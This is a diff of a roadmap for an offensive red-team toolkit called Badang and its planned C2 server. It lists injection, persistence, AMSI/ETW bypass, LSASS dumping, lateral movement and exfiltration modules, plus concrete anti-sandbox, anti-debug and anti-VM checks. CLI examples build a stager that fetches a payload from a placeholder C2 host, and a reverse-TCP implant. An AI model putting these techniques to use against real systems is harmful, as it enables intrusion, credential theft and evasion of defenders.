@@ -1,18 +1,22 @@
-# Red Team Toolchain Roadmap
+# Roadmap
 
-Five products cover the entire kill chain. Post-exploitation capabilities (credentials, lateral movement, persistence, exfiltration, tunneling) ship as C2 modules, not standalone tools.
+Two projects cover the full kill chain. Badang is the main project — everything that runs on the target. The C2 server is the next project — the attacker-side control plane.
 
 ---
 
-## The 5 Products
+## The 2 Projects
 
-| # | Product | Kill Chain Stages | Status |
-|---|---------|-------------------|--------|
-| 1 | **Badang** | Weaponize + Exploit + Install + Evasion | **Complete** — 8 injection techniques, 6 persistence methods, stager payload, output packaging |
-| 2 | **Loader/Stager** | Delivery + Exploit | Next |
-| 3 | **C2 Framework** | C2 + Actions (creds, lateral, persist, exfil, tunnel as modules) | Planned |
-| 4 | **Phishing Toolkit** | Delivery | Planned |
-| 5 | **Recon/OSINT** | Reconnaissance | Planned |
+| # | Project | Role | Status |
+|---|---------|------|--------|
+| 1 | **Badang** (main) | Target-side platform — evasion, injection, persistence, comms, loader, post-ex | Phase 1 complete, expanding |
+| 2 | **C2 Server** (next) | Attacker-side — listeners, task queue, operator web UI | Planned |
+
+Future additions (separate projects):
+
+| # | Project | Role |
+|---|---------|------|
+| 3 | **Phishing Toolkit** | Delivery — email templates, macro/HTA/LNK/ISO packaging, tracking, landing page cloner |
+| 4 | **Recon/OSINT** | Reconnaissance — subdomain enum, email harvest, tech fingerprint, breach lookup |
 
 ---
 
@@ -21,64 +25,56 @@ Five products cover the entire kill chain. Post-exploitation capabilities (crede
 ```
 ┌──────────────────────────────────────────────────────────────────────┐
 │                         RED TEAM KILL CHAIN                          │
-│                          5 products, full coverage                    │
+│                 2 projects, full target + attacker coverage           │
 ├──────────────┬───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  1. RECON    │  [5] Recon/OSINT                                      │
-│              │      Subdomain enum, email harvest, tech fingerprint,  │
-│              │      credential breach lookup, org chart mapping       │
+│  1. RECON    │  [4] Recon/OSINT (future)                             │
+│              │      Subdomain enum, email harvest, tech fingerprint   │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
 │  2. WEAPON-  │  [1] Badang                                           │
 │     IZE      │      Payload generation (exec, reverse, bind, stager) │
 │              │      Payload encryption (XOR/RC4 + PIC stubs)         │
-│              │      Output formats (raw, reflective DLL, runner EXE) │
+│              │      Output formats (Exe, Ps1, CSharp, Dll)           │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  3. DELIVER  │  [4] Phishing Toolkit                                 │
-│              │      Email templates, macro/HTA/LNK/ISO packaging,    │
-│              │      tracking pixels, landing page cloner             │
-│              │  [2] Loader/Stager                                    │
-│              │      HTTPS/DNS/SMB fetch, fileless execution          │
+│  3. DELIVER  │  [3] Phishing Toolkit (future)                        │
+│              │      Email templates, macro/HTA/LNK/ISO packaging     │
+│              │  [1] Badang — Loader module                            │
+│              │      Anti-sandbox, anti-debug, anti-VM, staged fetch   │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  4. EXPLOIT  │  [2] Loader/Stager                                    │
-│              │      Sandbox detection, anti-debug, in-memory exec    │
-│              │  [1] Badang                                           │
-│              │      ETW patching, AMSI bypass, indirect syscalls     │
+│  4. EXPLOIT  │  [1] Badang — Loader + Evasion                        │
+│              │      Sandbox detection, anti-debug, in-memory exec     │
+│              │      ETW patching, AMSI bypass, indirect syscalls      │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  5. INSTALL  │  [1] Badang                                           │
-│              │      8 injection techniques (CRT, APC, hijack, early  │
-│              │      bird, section map, callback, stomp, hollowing)   │
-│              │      Persistence (registry, schtask, WMI, COM, DLL   │
-│              │      hijack, service creation)                        │
+│  5. INSTALL  │  [1] Badang — Injection + Persistence                 │
+│              │      8 injection techniques (CRT, APC, hijack, early   │
+│              │      bird, section map, callback, stomp, hollowing)    │
+│              │      6 persistence methods (registry, schtask, WMI,    │
+│              │      COM, DLL hijack, service creation)                │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  6. C2       │  [3] C2 Framework                                     │
-│              │      Encrypted comms (HTTPS/DNS/SMB), task queue,     │
-│              │      checkin/checkout, operator web UI                 │
-│              │      Built-in tunnel module (SOCKS5, DNS, ICMP,       │
-│              │      port forward, multi-hop)                         │
+│  6. C2       │  [1] Badang — Comms module (target-side)              │
+│              │      Beacon loop, jitter, HTTPS/DNS/SMB channels,     │
+│              │      AES-256 transport encryption                      │
+│              │  [2] C2 Server (attacker-side)                        │
+│              │      Listeners, task queue, operator web UI,           │
+│              │      implant tracking, payload builder                 │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
-│  7. ACTIONS  │  [3] C2 Modules:                                      │
-│              │      Credentials — LSASS dump, SAM/SYSTEM, Kerberos,  │
-│              │                    DPAPI, browser creds               │
-│              │      Lateral    — PsExec, WMI, DCOM, WinRM, PtH,     │
-│              │                   overpass-the-hash, Kerberoasting    │
-│              │      Persist    — registry, schtask, WMI, COM, DLL,  │
-│              │                   service (remote deployment)         │
-│              │      Exfil      — DNS/HTTPS/cloud, stego, encrypted  │
-│              │                   archives, chunked, throttled        │
-│              │      Tunnel     — SOCKS5, port forward, DNS/ICMP     │
-│              │                   tunnel, reverse SSH, multi-hop      │
+│  7. ACTIONS  │  [1] Badang — Post-ex modules                         │
+│              │      Credentials — LSASS dump, SAM/SYSTEM, tokens     │
+│              │      Lateral    — PsExec, WMI, WinRM, PtH             │
+│              │      Exfil      — DNS/HTTPS/cloud, staged, encrypted  │
+│              │      Tunnel     — SOCKS5, port forward                 │
 │              │                                                       │
 ├──────────────┼───────────────────────────────────────────────────────┤
 │              │                                                       │
@@ -97,132 +93,187 @@ Five products cover the entire kill chain. Post-exploitation capabilities (crede
 
 ---
 
-## Flow
+## Architecture
 
 ```
-[5] Recon ──► [4] Phishing ──► [2] Stager ──► [1] Badang (evasion)
-                                     │
-                                     ▼
-                               [3] C2 Framework
-                                     │
-                       ┌──────┬──────┼──────┬──────┐
-                       ▼      ▼      ▼      ▼      ▼
-                     Creds  Lateral Persist Exfil  Tunnel
-                              (C2 post-ex modules)
+TARGET MACHINE                              ATTACKER MACHINE
+──────────────                              ────────────────
+
+┌─────────────────────────────────┐
+│          BADANG (main)          │
+│                                 │
+│  ┌──────────┐  ┌─────────────┐ │
+│  │ Loader   │  │ Evasion     │ │
+│  │ anti-sb  │  │ ETW/AMSI    │ │
+│  │ anti-dbg │  │ sleep obfs  │ │         ┌──────────────────┐
+│  │ anti-vm  │  │ stack spoof │ │         │   C2 SERVER      │
+│  └────┬─────┘  └──────┬──────┘ │         │   (next project) │
+│       │               │        │         │                  │
+│  ┌────▼───────────────▼──────┐ │  HTTPS  │  ┌────────────┐ │
+│  │ Injection (8 techniques)  │ │ ◄──────►│  │ Listeners  │ │
+│  └────────────┬──────────────┘ │  DNS    │  │ Task Queue │ │
+│               │                │  SMB    │  │ Web UI     │ │
+│  ┌────────────▼──────────────┐ │         │  │ Tracking   │ │
+│  │ Comms (beacon loop)       │─┼─────────┼──┤            │ │
+│  │ HTTPS / DNS / SMB channel │ │         │  └────────────┘ │
+│  │ AES-256 transport         │ │         │                  │
+│  └────────────┬──────────────┘ │         └──────────────────┘
+│               │                │
+│  ┌────────────▼──────────────┐ │
+│  │ Persistence (6 methods)   │ │
+│  └────────────┬──────────────┘ │
+│               │                │
+│  ┌────────────▼──────────────┐ │
+│  │ Post-Ex modules           │ │
+│  │ creds │ lateral │ exfil   │ │
+│  │ tunnel │ ...              │ │
+│  └───────────────────────────┘ │
+│                                 │
+│  Payload gen + packaging        │
+│  (builds output for delivery)   │
+└─────────────────────────────────┘
 ```
 
 ---
 
-## Badang Modifications (Completed)
+## Badang — Build Phases
 
-All four additions are now implemented and shipped:
+### Phase 1: Core Platform (DONE)
 
-### 1. Persistence Module (new: `src/persistence/`)
+All shipped and pushed. Badang is the weaponize + exploit + install platform.
 
-Currently Badang injects into processes but nothing survives a reboot. Adding persistence makes it the single "establish foothold" tool.
+| Module | What | Status |
+|--------|------|--------|
+| Injection | 8 techniques (CRT, APC, hijack, early bird, section map, callback, stomp, hollowing) | Done |
+| Persistence | 6 methods (registry, schtask, WMI, DLL hijack, COM, service) | Done |
+| Payload | 6 types (exec, messagebox, reverse_tcp, bind_tcp, stager) + encryption (XOR/RC4) | Done |
+| Packaging | 4 output formats (Exe, Ps1, CSharp, Dll source templates) | Done |
+| Evasion | ETW patch, AMSI bypass, PPID spoof, sleep obfuscation, stack spoofing | Done |
+| Syscalls | Direct (SSN tables) + Indirect (Hell's Gate / Halo's Gate) | Done |
+| Analysis | Hook detection (13 APIs) + API restoration (3 methods) | Done |
+| IAT Evasion | Dynamic API resolution (40+ wrappers), XOR string obfuscation, string sanitization | Done |
 
-| Technique | Method | Detection Difficulty |
-|-----------|--------|---------------------|
-| Registry Run Keys | `HKCU\...\Run` | Low — well-known, easy to audit |
-| Scheduled Task | COM or direct API (`ITaskService`) | Medium |
-| WMI Event Subscription | `__EventFilter` + `CommandLineEventConsumer` | High — survives in WMI repository |
-| DLL Search Order Hijack | Drop DLL in app directory | High — legitimate path, signed app loads it |
-| COM Hijacking | Override CLSID `InprocServer32` | High — rarely audited |
-| Service Creation | `CreateServiceW` with auto-start | Medium |
+### Phase 2: Communications Module (Next)
 
-**CLI**: `badang-cli persist --method registry --payload runner.exe -x -c`
-**GUI**: New Persist tab with method dropdown, target path, payload path.
+Beacon loop + C2 channels. Without comms, Badang can't receive tasks or report back.
 
-### 2. Stager Payload Type (modify: `src/payload/generate.rs`)
-
-Add a `stager` type to the existing shellcode generator. The stager is PIC shellcode that:
-1. Resolves WinHTTP APIs via PEB walk (same pattern as existing payloads)
-2. Fetches encrypted payload from a URL
-3. Decrypts in memory (XOR/RC4, key baked into the stub)
-4. Jumps to decrypted payload
-
-```bash
-badang-cli generate --type stager --url https://c2.example.com/p.bin --key "s3cret" -o stager.bin
+```
+src/comms/
+  mod.rs      — beacon loop, task dispatch, jitter/interval config
+  http.rs     — HTTPS channel via WinHTTP (dynamic resolve, same pattern as resolve.rs)
+  dns.rs      — DNS channel (TXT record queries for tasking, A/AAAA for responses)
+  smb.rs      — SMB named pipe channel (lateral movement, internal networks)
+  crypto.rs   — AES-256 transport encryption (key exchange on first checkin)
 ```
 
-This bridges Badang directly to the C2 — no separate stager project needed for simple operations. The standalone Loader/Stager project (product #2) adds sandbox detection, anti-debug, and multi-channel support on top.
+| Feature | Detail |
+|---------|--------|
+| Beacon loop | Configurable interval + jitter (percentage-based randomization) |
+| HTTPS channel | WinHTTP via dynamic resolve, TLS, custom headers, proxy-aware |
+| DNS channel | TXT records for tasking, encoded responses, slow but stealthy |
+| SMB channel | Named pipes for internal pivoting, no internet required |
+| Transport crypto | AES-256-CBC, key derived from initial handshake, per-session |
+| Task dispatch | Receive task ID + payload from C2, execute, return results |
 
-### 3. Output Formats (modify: `src/payload/`)
+### Phase 3: Loader Module
 
-Currently outputs raw `.bin` only. Add packaging for delivery vectors:
+Anti-analysis checks before the implant runs. Integrates with existing `src/evasion/`.
 
-| Format | Flag | Use Case |
-|--------|------|----------|
-| Raw shellcode | `--format raw` | Default, current behavior |
-| Reflective DLL | `--format rdll` | DLL sideloading, rundll32 |
-| Shellcode Runner EXE | `--format exe` | Standalone dropper with Badang evasion baked in |
-| PowerShell cradle | `--format ps1` | One-liner download + execute |
-| DLL (export hijack) | `--format dll` | Drop-in for hijackable DLL paths |
-
-```bash
-badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --format exe -o implant.exe
+```
+src/loader/
+  mod.rs         — orchestrator: checks → unhook → decrypt → inject
+  sandbox.rs     — sleep acceleration, process count, disk size, username
+  antidebug.rs   — NtQueryInformationProcess, PEB check, timing
+  antivm.rs      — CPUID, registry keys, MAC prefix, WMI
 ```
 
-### 4. Process Hollowing (new: `src/injection/hollowing.rs`)
+| Check | Technique |
+|-------|-----------|
+| Sandbox | Sleep acceleration (sleep 10s, check elapsed < 10s = sandbox) |
+| Sandbox | Process count < 50 = sandbox |
+| Sandbox | Disk size < 60GB = sandbox |
+| Sandbox | Username = "sandbox", "malware", "virus" = sandbox |
+| Debug | `NtQueryInformationProcess(ProcessDebugPort)` |
+| Debug | PEB `BeingDebugged` flag via `gs:[0x60] + 0x02` |
+| Debug | `rdtsc` timing check (> threshold = debugger stepping) |
+| VM | CPUID hypervisor bit (ECX bit 31) |
+| VM | Registry `HKLM\SOFTWARE\VMware` / `VirtualBox` |
+| VM | MAC prefix `00:0C:29` (VMware), `08:00:27` (VBox) |
 
-One injection technique gap. Process hollowing:
-1. Create process suspended (`CREATE_SUSPENDED`)
-2. Unmap original image (`NtUnmapViewOfSection`)
-3. Allocate memory at image base, write payload PE
-4. Set entry point in thread context
-5. Resume
+### Phase 4: Post-Exploitation — Credentials + Lateral
 
-Useful for the stager — creates a clean, legitimate-looking process to live in. Brings injection count from 7 to 8.
+First post-ex capabilities, loaded on demand by the comms module.
 
-**CLI**: `badang-cli inject --technique hollowing --payload implant.exe -x -c`
+```
+src/postex/
+  mod.rs       — module loader, result formatting
+  creds.rs     — LSASS dump (MiniDumpWriteDump via direct syscall), SAM, token manipulation
+  lateral.rs   — PsExec (service-based), WMI exec, WinRM, pass-the-hash
+```
+
+### Phase 5: Post-Exploitation — Exfil + Tunnel
+
+Complete the post-ex suite.
+
+```
+src/postex/
+  exfil.rs     — staged file extraction over comms channels, chunked, encrypted
+  tunnel.rs    — SOCKS5 proxy, local/remote port forwarding
+```
+
+---
+
+## C2 Server — Next Project
+
+Separate repository. The attacker-side control plane that Badang's comms module talks to.
+
+```
+badang-c2/
+├── server/              Rust backend
+│   ├── listeners/       HTTPS, DNS, SMB listener threads
+│   ├── tasks/           Task queue per implant (FIFO)
+│   ├── crypto/          Session key management, AES-256
+│   ├── tracking/        Implant registry (ID, OS, user, last seen)
+│   └── api/             REST API for operator web UI
+├── web/                 Operator dashboard
+│   ├── implants/        Live implant table, status, last checkin
+│   ├── tasks/           Task builder, history, output viewer
+│   └── listeners/       Listener management (start/stop/config)
+└── builder/             Implant config generator
+    └── profiles/        Pre-built configs (stealth, noisy, pivot)
+```
+
+| Component | What |
+|-----------|------|
+| **Listeners** | HTTPS (TLS termination), DNS (authoritative nameserver), SMB (named pipe server) |
+| **Task Queue** | Per-implant FIFO, task types: shell, upload, download, module load, config update |
+| **Implant Tracking** | ID, hostname, OS version, username, internal IP, last checkin, sleep interval |
+| **Operator UI** | Web dashboard — implant table, task builder, output viewer, listener management |
+| **Builder** | Generate Badang implant configs — C2 URL, channels, jitter, persistence method |
+
+Built with the same Rust patterns as Badang (string obfuscation, dynamic resolve) for the implant-facing components. Server components can use standard Rust web frameworks (axum/actix).
 
 ---
 
 ## Build Order
 
-### Phase 1: Expand Badang (DONE)
+| Phase | What | Project | Status |
+|-------|------|---------|--------|
+| 1 | Core platform (8 inject, 6 persist, stager, packaging, evasion, syscalls) | Badang | **Done** |
+| 2 | Comms module (beacon loop + HTTPS/DNS/SMB channels) | Badang | Next |
+| 3 | Loader module (anti-sandbox + anti-debug + anti-VM) | Badang | Planned |
+| 4 | C2 Server (listeners + task queue + web UI) | badang-c2 | Planned |
+| 5 | Post-ex: credentials + lateral movement | Badang | Planned |
+| 6 | Post-ex: exfiltration + tunneling | Badang | Planned |
+| 7 | Phishing toolkit + Recon/OSINT | New projects | Future |
 
-All four modifications shipped. Badang is the full weaponize + exploit + install platform.
-
-| Task | Status |
-|------|--------|
-| Persistence module (6 techniques) | Done |
-| Stager payload type (WinINet download + XOR decrypt) | Done |
-| Process hollowing (8th injection technique) | Done |
-| Output formats (Exe, Ps1, CSharp, Dll packaging) | Done |
-
-### Phase 2: Loader/Stager (product #2)
-
-Standalone binary with capabilities beyond Badang's stager shellcode:
-- Multi-channel fetch (HTTPS, DNS over HTTPS, SMB named pipe)
-- Sandbox detection (sleep acceleration, process count, disk size, username, domain-joined check)
-- Anti-debug (NtQueryInformationProcess, IsDebuggerPresent via PEB, timing checks)
-- Anti-VM (CPUID, registry keys, MAC address prefix, WMI queries)
-- Staged execution with multiple fallback URLs
-- Jitter and beacon interval randomization
-
-### Phase 3: C2 Framework (product #3)
-
-Server + implant architecture:
-- **Server**: Rust/Go backend, web UI for operators, listener management (HTTPS/DNS/SMB), task queue, implant tracking
-- **Implant**: Generated from Badang's stager template, calls back to server, executes tasked modules
-- **Modules** (shipped as loadable BOFs or Rust dylibs):
-  - `creds` — LSASS dump (direct syscall + minidump), SAM, Kerberos, DPAPI, browser
-  - `lateral` — PsExec, WMI, DCOM, WinRM, PtH, Kerberoast
-  - `persist` — remote deployment of Badang persistence techniques
-  - `exfil` — staged transfer over DNS/HTTPS/cloud, stego, encrypted archives
-  - `tunnel` — SOCKS5, port forward, DNS/ICMP tunnel, multi-hop
-
-### Phase 4: Phishing + Recon (products #4–5)
-
-- **Phishing**: Email campaign engine, template library, payload packager (wraps stager into macro/HTA/LNK/ISO), tracking server, landing page cloner
-- **Recon**: Subdomain enumeration (certificate transparency, DNS brute), email harvesting, tech stack fingerprinting (Wappalyzer-style), breach lookup integration
+Phases 2–3 and 4 can overlap — comms module needs a server to talk to, server needs an implant to manage.
 
 ---
 
 ## Shared Design Principles
 
-All 5 products follow the patterns established in Badang:
+All projects follow the patterns established in Badang:
 
 | Principle | Implementation |
 |-----------|---------------|
